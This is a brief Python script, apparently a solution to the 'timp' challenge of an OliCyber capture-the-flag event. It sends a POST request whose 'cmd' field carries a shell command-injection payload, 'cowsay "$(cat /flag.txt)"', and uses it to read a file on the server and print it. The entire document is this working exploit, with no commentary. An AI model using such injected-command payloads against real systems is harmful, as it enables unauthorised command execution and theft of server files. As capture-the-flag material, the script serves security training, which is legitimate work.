import requests

url = "http://timp.challs.olicyber.it/handler.php"

data={
    "cmd": 'cowsay "$(cat /flag.txt)"'
}

response = requests.post(url, data=data)

print(response.text)